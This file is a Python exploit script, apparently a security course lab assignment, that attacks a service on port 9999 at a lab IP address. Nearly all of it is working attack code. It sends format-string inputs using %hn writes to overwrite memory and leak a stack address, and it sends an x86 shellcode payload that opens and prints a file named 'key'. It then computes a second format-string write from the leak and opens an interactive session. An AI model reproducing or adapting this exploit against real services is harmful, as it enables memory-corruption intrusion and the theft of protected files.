# python assign5payload3.py 192.168.147.179 9999
import socket
import sys
import time
import telnetlib


def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact()

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server_address = (sys.argv[1], 9999)
print("Connecting to %s port %s" % server_address)
sock.connect(server_address)
time.sleep(1)

#                                                                                                  
payload = "quitAAAA\x14\xa0\x04\x08\x16\xa0\x04\x08AAAAAAAAAAAAAAAAAAAA\xeb\x4c\x5e\x89\xf3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x05\x00\x00\x00\xcd\x80\x50\x50\x8b\x5c\x24\x04\xb8\x03\x00\x00\x00\x89\xe1\xba\x01\x00\x00\x00\xcd\x80\x83\xf8\x00\x7e\x15\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xba\x01\x00\x00\x00\x89\xe1\xcd\x80\xeb\xd4\x31\xc0\xbb\x00\x00\x00\x00\x40\xcd\x80\xe8\xaf\xff\xff\xff\x6b\x65\x79\x00\n"

name = "%34075c%14$hn%77$x\n"

#send the first input to name
sock.send(name)
time.sleep(1)

#send the payload
sock.send(payload)
time.sleep(1)

#receive the information leak
leakValue = sock.recv(100000)
print leakValue 

#use the leak to compute the address to use in the second input to main
address = leakValue[-15:-7]
print address 
leftPart = int(address[0:4], 16)
rightPart = int(address[4:], 16)
rightPart -= 260

if leftPart > rightPart:
	a = str(rightPart)
	b = str(leftPart - rightPart)
else:
	a = str(leftPart)
	b = str(rightPart - leftPart)

#second input to name 
name2 = "%" + a + "c%14$hn%" + b + "c%15$hn\n"

#send the second input to name
sock.send(name2)
time.sleep(1)

#have to send something for the echo buffer, so just reuse the payload
sock.send(payload)
time.sleep(1)

#name = "%56700c%14$hn%8835c%15$hn\n"

#raw_input("wait")

# sock.send(name)
# time.sleep(1)

# sock.send(payload)
# time.sleep(1)

interact(sock)






